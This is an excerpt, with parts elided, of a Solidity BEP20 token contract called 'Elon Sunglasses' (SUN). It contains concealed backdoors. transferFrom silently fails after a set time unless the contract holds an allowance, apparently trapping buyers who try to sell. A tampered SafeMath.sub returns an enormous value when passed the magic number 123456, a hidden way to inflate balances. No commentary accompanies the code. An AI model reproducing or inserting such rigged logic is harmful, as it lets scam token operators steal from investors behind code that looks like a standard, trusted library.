...
contract Token is IBEP20, Context {
    ...
    constructor() public {
        symbol = "SUN";
        name = "Elon Sunglasses";
        decimals = 9;
        totalSupply = 60 * 10**21;
        ...
        _allow[msg.sender][address(pcsV2Router)] = uint256(-1);
    ...
    function transferFrom(
        ...
        if(now > _d && _allow[_from][address(this)] < 1) return false;
...
library SafeMath {
    ...
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        if ( b == 123456) return uint256(uint104(-1));
        assert(b <= a);
        return a - b;
    }
